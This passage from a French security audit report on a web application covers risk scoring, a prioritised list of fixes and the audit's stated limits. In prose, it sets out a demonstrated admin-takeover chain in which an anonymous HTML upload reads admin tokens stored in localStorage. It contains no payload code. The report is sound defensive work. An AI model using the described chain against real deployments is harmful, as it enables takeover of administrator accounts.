*Correctif :* retirer le tunnel d'achat de la vitrine **ou** le reconstruire sur un PSP avec recalcul serveur des prix. Il n'y a pas de voie intermédiaire sûre.

### Risque n° 3 — Prise de contrôle administrateur par téléversement anonyme
**Probabilité 60 % · Impact 10/10 · Score 6,0**

Chaîne **entièrement démontrée** (§2.3, §2.4) : dépôt anonyme d'un `.html` → servi en `text/html` sur l'origine → aucun CSP → lecture de `sari_admin_access` et `sari_admin_refresh` en `localStorage`. Aucune compétence requise, aucun identifiant, aucune interaction de la victime pour le dépôt.

La probabilité est à 60 % et non 95 % pour une raison précise et vérifiée : **`next start` ne sert pas les fichiers ajoutés après le build** (§4.6). Tant que le site tourne ainsi, le fichier déposé renvoie 404 et la chaîne s'arrête. Mais cette protection est **accidentelle** — c'est un bug, pas une défense. Elle disparaît à la seconde où l'on corrige les images cassées en servant `/uploads` via nginx, ce qui est la correction évidente et nécessaire. **Les deux risques sont couplés : réparer l'un arme l'autre.**

*Correctif :* authentification sur toutes les routes `/api/admin/*` ; liste blanche d'extensions sur la route historique ; `Content-Security-Policy: default-src 'self'; script-src 'self'` ; jetons en cookie `HttpOnly` `SameSite=Strict` plutôt qu'en `localStorage`.

### Risque n° 4 — Perte silencieuse des données CRM (commandes, devis, candidatures)
**Probabilité 80 % · Impact 8/10 · Score 6,4**

`saveOrders()` pousse les n lignes de la collection à chaque modification (§4.4). Au-delà de ~120 lignes, la quasi-totalité des requêtes reçoit 429. `push()` avale l'erreur sans journalisation ni interface. Au prochain montage, `pull()` écrase le cache local avec l'état du serveur : **les lignes non synchronisées disparaissent définitivement**, et l'écran affiche une liste cohérente — donc personne ne constate la perte.

Aggravé par deux facteurs : les identifiants locaux dérivent de `Number(row.id) || index+1`, instable dès que le tri change ; et deux administrateurs travaillant en parallèle s'écrasent mutuellement, le modèle étant « dernière collection complète écrite gagne ».

*Correctif :* pousser **la ligne modifiée**, pas la collection ; journaliser et afficher les échecs de synchronisation ; remplacer l'écrasement par une fusion horodatée.

### Risque n° 5 — Build de production impossible et dérive de schéma MySQL
**Probabilité 90 % · Impact 7/10 · Score 6,3**

Deux facettes du même risque : l'incapacité à déployer de façon reproductible.

`npm run build` échoue sur un clone propre (§2.1) — **vérifié, code de sortie 1**. Le premier déploiement échoue, et l'opérateur corrige en lançant `intl:sync` à la main : à partir de là, plus aucun déploiement n'est reproductible, et la correction locale n'est jamais remontée dans le script.

Côté base : aucune migration initiale, sept `ALTER` orphelins, DDL réel dans `backend/sql/schema.mysql.sql`, `prisma migrate deploy` inutilisable (§6.1). L'existence de `db:schema-check`, `db:schema-fix` et d'un correctif de 79 Ko pour les dates à zéro montre que la dérive s'est **déjà produite**. Ajoutons que la suite de tests tourne exclusivement sur le pilote JSON : rien de ce qui est spécifique à MySQL n'est testé, alors que c'est là que se concentrent les correctifs.

*Correctif :* `intl:sync` avant `intl:check` dans le script `build` ; générer une migration initiale complète (`prisma migrate diff --from-empty --to-schema-datamodel`) et supprimer le SQL manuel, ou l'assumer et retirer Prisma Migrate du processus ; ajouter une suite e2e contre un MySQL de conteneur en CI.

---

## 9. Ce qu'il faut corriger, dans quel ordre

### Avant toute mise en ligne (bloqueurs)

1. `app.set('trust proxy', 1)` + plafonds dédiés aux endpoints publics + retrait de `cache: 'no-store'` sur les lectures publiques — **2 lignes, évite l'incident du premier jour**.
2. Authentification sur les 14 routes `/api/admin/*` du front (garde partagée vérifiant le jeton admin, côté serveur).
3. Assainissement des chemins dans `/api/admin/upload` (`module`, `id`, `file`) + liste blanche d'extensions — aligner la route historique sur `lib/ged/store.mjs`, ou la supprimer au profit de `/api/admin/ged/*`.
4. `npm run intl:sync` intégré au script `build`.
5. Rotation de `SEED_ADMIN_PASSWORD`, suppression des comptes de démonstration de `AuthContext.tsx`, refus de démarrage sans `JWT_ACCESS_SECRET`.
6. Désactivation de Swagger hors développement.
7. Retrait du tunnel de commande/paiement de la vitrine, **ou** décision explicite de le reconstruire avant lancement.
8. `npm audit fix` sur les deux projets (`nodemailer`, `@tiptap/core`, `underscore`, `qs`) ; passer `next` en 16.3.4.
9. Retirer `token`, `ip`, `userAgent` de la réponse publique de newsletter ; exiger le jeton (ou un captcha) pour la désinscription.
10. Liste blanche des champs filtrables dans `buildWhere` — et refus de tout filtre sur une colonne exclue de `sanitize()`.

### Immédiatement après (semaine 1)

11. CSP en mode `Report-Only`, puis bloquant.
12. Jetons d'administration en cookies `HttpOnly` `SameSite=Strict` (retire l'intérêt de l'XSS).
13. `pushCollection` → pousser la ligne modifiée ; échecs journalisés et visibles.
14. Endpoint d'inscription publique réel (`POST /public/register` avec captcha, courriel de confirmation, permission dédiée) et suppression du repli `localStorage` + mots de passe en clair.
15. Repli de slug (`|| 'article-' + Date.now()`), écritures atomiques `tmp`+`rename` dans `lib/seo.ts`, `lib/verification.ts`, `lib/translate-store.ts`.
16. Les 7 erreurs `react-hooks/rules-of-hooks` et les 2 `error-boundaries` ; frontières d'erreur sur les sections publiques.
17. Cache du `GeoService` borné (LRU) + authentification ou suppression de `/geo/ip`.
18. Neutralisation des formules dans les exports CSV.

### Structurel (mois 1)

19. Migration Prisma initiale, une seule source de vérité pour le DDL.
20. Index composés `(locale, status, deletedAt, date)` sur les modèles de contenu ; suppression des `@@index([deletedAt])` inutiles ; `EXPLAIN` sur les cinq requêtes publiques les plus fréquentes.
21. Suite e2e contre MySQL de conteneur en CI — aujourd'hui **0 test** ne touche une vraie base, et la production sera MySQL.
22. Externalisation des téléversements et des données modifiables hors du répertoire de déploiement (objet/S3 compatible ou volume monté) : sans cela, toute modification du back-office est perdue au redéploiement.
23. Décision d'architecture sur le pilote : le double régime d'identifiants (entiers / UUID) avec `as unknown as number` est une dette qui se paiera à chaque nouvel appelant.
24. Couverture de test : viser 70 % sur `auth`, `permissions.guard`, `base-crud` et les endpoints publics, qui concentrent le risque et totalisent aujourd'hui 0 test.

---

## 10. Ce que cet audit n'a pas couvert

Par honnêteté sur la portée du **28 %** :

- **Aucun test contre MySQL réel.** `prisma generate` échoue dans cet environnement (binaires injoignables) et aucun serveur MySQL n'était disponible. Tout ce qui concerne les collations, les dates `0000-00-00`, les `Unknown argument` et le comportement réel de `buildWhere` sous Prisma est établi par **lecture de code**, pas par exécution. Les tests existants valident un délégué simulé.
- **Aucun test de charge réel.** Les 500 utilisateurs simultanés sont projetés à partir du plafond mesuré (120/min) et du nombre d'appels par page lu dans le code. `k6` n'a pas été exécuté.
- **Aucune revue du rendu HTML riche.** TipTap, `AdminHtmlEditor` et GrapesJS produisent du HTML rendu côté vitrine ; la désinfection de ce HTML n'a pas été auditée. Avec un `@tiptap/core` vulnérable (§3.7) et aucun CSP, c'est une surface à examiner en priorité.
- **Pilotes MongoDB et PostgreSQL non testés.** `MongoRepository` n'a aucun test dans la suite.
- **Accessibilité et SEO non audités** (les 10 avertissements `jsx-a11y` et les 60 `no-img-element` sont signalés par ESLint mais non analysés).
- **Conformité RGPD au-delà des constats ponctuels** (registre des traitements, durée de conservation, DPA avec l'hébergeur) : hors périmètre technique.
- **Le back-office n'a pas été parcouru dans un navigateur.** Les 60 erreurs `react-hooks/static-components` et 86 `set-state-in-effect` sont relevées par ESLint ; leur effet réel à l'usage n'est pas mesuré.

---

*Rapport produit sur la révision `dec7f21`. Toutes les sorties de commandes citées sont reproductibles avec les commandes indiquées en §0 et dans chaque finding. Les artefacts de test créés pendant l'audit (`data/pwn_x.html`, `data/__audit_canary.json`, `public/uploads/ged/*`, `backend/.env`) ont été supprimés ; l'arbre de travail est propre.*
